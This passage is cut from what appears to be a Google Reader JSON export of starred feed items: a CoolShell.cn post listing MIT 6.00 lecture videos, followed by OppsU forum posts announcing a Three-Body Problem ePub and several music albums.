width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"7: Lists and Mutability, Dictionaries, Introduction to Efficiency\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7\"> \n<p></p></a><a title=\"7: Lists and Mutability, Dictionaries, Introduction to Efficiency\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7/lec07.jpg\" alt=\"\"></a></td>\n<td>\n<p>7: Lists and Mutability, Dictionaries, Introduction to Efficiency</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p6.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"8: Complexity: Log, Linear, Quadratic, Exponential Algorithms\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8\"> \n<p></p></a><a title=\"8: Complexity: Log, Linear, Quadratic, Exponential Algorithms\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8/lec08.jpg\" alt=\"\"></a></td>\n<td>\n<p>8: Complexity: Log, Linear, Quadratic, Exponential Algorithms</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p7.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"9: Binary Search, Bubble and Selection Sorts\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9\"> \n<p></p></a><a title=\"9: Binary Search, Bubble and Selection Sorts\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9/lec09.jpg\" alt=\"\"></a></td>\n<td>\n<p>9: Binary Search, Bubble and Selection Sorts</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p8.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"10: Divide and Conquer Methods, Merge Sort, Exceptions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10\"> \n<p></p></a><a title=\"10: Divide and Conquer Methods, Merge Sort, Exceptions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10/lec10.jpg\" alt=\"\"></a></td>\n<td>\n<p>10: Divide and Conquer Methods, Merge Sort, Exceptions</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-10\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p9.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"11: Testing and Debugging\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11\"> \n<p></p></a><a title=\"11: Testing and Debugging\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11/lec11.jpg\" alt=\"\"></a></td>\n<td>\n<p>11: Testing and Debugging</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-11\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p10.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"12: Debugging, Knapsack Problem, Introduction to Dynamic Programming\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12\"> \n<p></p></a><a title=\"12: Debugging, Knapsack Problem, Introduction to Dynamic Programming\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12/lec12.jpg\" alt=\"\"></a></td>\n<td>\n<p>12: Debugging, Knapsack Problem, Introduction to Dynamic Programming</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-12\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p11.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13\"> \n<p></p></a><a title=\"13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13/lec13.jpg\" alt=\"\"></a></td>\n<td>\n<p>13: Dynamic Programming: Overlapping Subproblems, Optimal Substructure</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-13\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p12.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"14: Introduction to Object-oriented Programming\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14\"> \n<p></p></a><a title=\"14: Introduction to Object-oriented Programming\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14/lec14.jpg\" alt=\"\"></a></td>\n<td>\n<p>14: Introduction to Object-oriented Programming</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-14\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p13.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"15: Abstract Data Types, Classes and Methods\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15\"> \n<p></p></a><a title=\"15: Abstract Data Types, Classes and Methods\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15/lec15.jpg\" alt=\"\"></a></td>\n<td>\n<p>15: Abstract Data Types, Classes and Methods</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-15\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p14.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"16: Encapsulation, Inheritance, Shadowing\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16\"> \n<p></p></a><a title=\"16: Encapsulation, Inheritance, Shadowing\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16/lec16.jpg\" alt=\"\"></a></td>\n<td>\n<p>16: Encapsulation, Inheritance, Shadowing</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-16\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p15.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"17: Computational Models: Random Walk Simulation\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17\"> \n<p></p></a><a title=\"17: Computational Models: Random Walk Simulation\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17/lec17.jpg\" alt=\"\"></a></td>\n<td>\n<p>17: Computational Models: Random Walk Simulation</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-17\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p16.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"18: Presenting Simulation Results, Pylab, Plotting\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18\"> \n<p></p></a><a title=\"18: Presenting Simulation Results, Pylab, Plotting\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18/lec18.jpg\" alt=\"\"></a></td>\n<td>\n<p>18: Presenting Simulation Results, Pylab, Plotting</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-18\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p17.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"19: Biased Random Walks, Distributions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19\"> \n<p></p></a><a title=\"19: Biased Random Walks, Distributions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19/lec19.jpg\" alt=\"\"></a></td>\n<td>\n<p>19: Biased Random Walks, Distributions</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-19\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p18.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"20: Monte Carlo Simulations, Estimating pi\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20\"> \n<p></p></a><a title=\"20: Monte Carlo Simulations, Estimating pi\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20/lec20.jpg\" alt=\"\"></a></td>\n<td>\n<p>20: Monte Carlo Simulations, Estimating pi</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-20\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p19.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"21: Validating Simulation Results, Curve Fitting, Linear Regression\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21\"> \n<p></p></a><a title=\"21: Validating Simulation Results, Curve Fitting, Linear Regression\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21/lec21.jpg\" alt=\"\"></a></td>\n<td>\n<p>21: Validating Simulation Results, Curve Fitting, Linear Regression</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-21\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p20.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"22: Normal, Uniform, and Exponential Distributions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22\"> \n<p></p></a><a title=\"22: Normal, Uniform, and Exponential Distributions\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22/lec22.jpg\" alt=\"\"></a></td>\n<td>\n<p>22: Normal, Uniform, and Exponential Distributions</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-22\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p21.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"23: Stock Market Simulation\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23\"> \n<p></p></a><a title=\"23: Stock Market Simulation\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23/lec23.jpg\" alt=\"\"></a></td>\n<td>\n<p>23: Stock Market Simulation</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-23\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p22.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"24: Course Overview; What Do Computer Scientists Do?\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24\"> \n<p></p></a><a title=\"24: Course Overview; What Do Computer Scientists Do?\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24/lec24.jpg\" alt=\"\"></a></td>\n<td>\n<p>24: Course Overview; What Do Computer Scientists Do?</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-24\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p23.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<h3>相关文章</h3><ul><li>2011年03月04日 -- <a href=\"http://coolshell.cn/articles/3903.html\" title=\"一些有意思的贴子和工具\">一些有意思的贴子和工具</a></li><li>2010年11月25日 -- <a href=\"http://coolshell.cn/articles/3311.html\" title=\"几篇技术文章\">几篇技术文章</a></li><li>2010年11月08日 -- <a href=\"http://coolshell.cn/articles/3270.html\" title=\"两本电子书\">两本电子书</a></li><li>2010年10月18日 -- <a href=\"http://coolshell.cn/articles/3192.html\" title=\"一些非常不错的资料\">一些非常不错的资料</a></li><li>2010年09月28日 -- <a href=\"http://coolshell.cn/articles/3013.html\" title=\"一些非常有意思的杂项资源\">一些非常有意思的杂项资源</a></li><li>2010年08月26日 -- <a href=\"http://coolshell.cn/articles/2853.html\" title=\"实用Android开发工具和资源精选\">实用Android开发工具和资源精选</a></li><li>2010年08月04日 -- <a href=\"http://coolshell.cn/articles/2775.html\" title=\"免费电子书列表\">免费电子书列表</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915796739",
    "timestampUsec" : "1299915796739803",
    "id" : "tag:google.com,2005:reader/item/4346673b7ecda4d4",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "iBooks电子书屋" ],
    "title" : "刘慈欣&lt;三体 - ePub&gt; [115] 情人节免刀",
    "published" : 1299915796,
    "updated" : 1299915796,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-58329.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[书名]：三体 \n[作者]：刘慈欣 \n[封面]：<a href=\"http://img3.douban.com/lpic/s2768378.jpg\">http://img3.douban.com/lpic/s2768378.jpg</a> \n\n[内容简介]： \n　　文化大革命如火如荼进行的同时。军方探寻外星文明的绝秘计划“红岸工程”取得了突破性进展。但在按下发射键的那一刻，历经劫难的叶文洁没有意识到，她彻底改变了人类的命运。地球文明向宇宙发出的第一声啼鸣，以太阳 .."
    },
    "author" : "sammeyhu",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-24.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915312898",
    "timestampUsec" : "1299915312898770",
    "id" : "tag:google.com,2005:reader/item/d302a4d3f9e02bb9",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Nelly&lt;5.0&gt;不需要介绍吧 [115]",
    "published" : 1299915312,
    "updated" : 1299915312,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-55269.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING:  OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to  be REPOSTED to other  forums and blogs ,  otherswise your ID &amp; IP will be blocked FOREVER!!! \nOppsU！的资源未经发帖人同意严禁无良转载到其他AAC论坛, 某些论坛的AAC区, 博客等 \n\n♪ .."
    },
    "author" : "loi",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915300370",
    "timestampUsec" : "1299915300370563",
    "id" : "tag:google.com,2005:reader/item/0a987438c6b8e209",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Libera&lt;Libera Luminosa&gt;天使的声音 天使之翼合唱团 第八弹 强烈推荐[115]",
    "published" : 1299915300,
    "updated" : 1299915300,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-57298.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING: OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to be REPOSTED to other forums and blogs , otherwise your ID &amp; IP will be blocked FOREVER!!! \n★封面★ \n\n★曲目★ \n\n★正版截图★ \n\n★简介★ \n一提起童声合唱团，人们首先会联想起的就是vienna boys&#39; choir与他们那甜亮清新的童声， .."
    },
    "author" : "大师兄",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915299643",
    "timestampUsec" : "1299915299643153",
    "id" : "tag:google.com,2005:reader/item/3f6be1fa692d782d",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Libera&lt;Luminosa&gt;天使的声音 天使之翼合唱团 第七弹 强烈推荐[115]",
    "published" : 1299915299,
    "updated" : 1299915299,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-57257.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING: OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to be REPOSTED to other forums and blogs , otherwise your ID &amp; IP will be blocked FOREVER!!! \n★封面★ \n\n★曲目★ \n\n★正版截图★ \n\n★简介★ \n一提起童声合唱团，人们首先会联想起的就是vienna boys&#39; choir与他们那甜亮清新的童声， .."
    },
    "author" : "大师兄",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915290321",
    "timestampUsec" : "1299915290321688",
    "id" : "tag:google.com,2005:reader/item/2f925a10cf3a8a13",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Libera&lt;New Dawn&gt;天使的声音 天使之翼合唱团 第九弹 强烈推荐[115]",
    "published" : 1299915290,
    "updated" : 1299915290,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-57312.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING: OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to be REPOSTED to other forums and blogs , otherwise your ID &amp; IP will be blocked FOREVER!!! \n★封面★ \n\n★曲目★ \n\n★正版截图★ \n\n★简介★ \n\n一提起童声合唱团，人们首先会联想起的就是vienna boys&#39; choir与他们那甜亮清新的童声 .."
    },
    "author" : "大师兄",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915280147",
    "timestampUsec" : "1299915280147957",
    "id" : "tag:google.com,2005:reader/item/016fc1965e21fc16",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Gordon Chambers&lt;Love Stories&gt; 格莱美奖得主 全能词曲唱作人 堪称完美的巅峰之作[115]",
    "published" : 1299915280,
    "updated" : 1299915280,
    "alternate" : [ {
      "href" : "http://oppsu.cn.tel2.artyoo.cn/read.php?tid-57353.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING: OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to be REPOSTED to other forums and blogs , otherswise your ID &amp; IP will be blocked FOREVER!!!\n❤专辑封面❤\n\n❤曲目列表❤\n\n❤正版凭证❤\n\n❤专辑简介❤\n\n　　继 Craig David、Boy .."
    },
    "author" : "xiney",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915272018",
    "timestampUsec" : "1299915272018532",
    "id" : "tag:google.com,2005:reader/item/fe684ae3ae1f80d6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Lucy Wainwright  Roche&lt;8 MORE&gt;干净的女声[115]",
    "published" : 1299915272,
    "updated" : 1299915272,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-57617.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑曲目1.) Awhile2.) Snare Drum 3.) University Drive4.) Chicago 5.) Superman 6.) Spring Song 7.) Poison8.) Hungry Heart 专辑简介Released last year, 8 Songs mixes up trad evergreens, covers and self-penned numbers, her appealing readings of Wild Mountain Thyme and an a cappella Barbara Allen set a .."
    },
    "author" : "xuluwei",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915141487",
    "timestampUsec" : "1299915141487285",
    "id" : "tag:google.com,2005:reader/item/f84e2659a760b5b5",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Tracy Johnson&lt;The Art of Dreaming&gt;免刀，很舒服的女声[115]",
    "published" : 1299915141,
    "updated" : 1299915141,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-58439.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
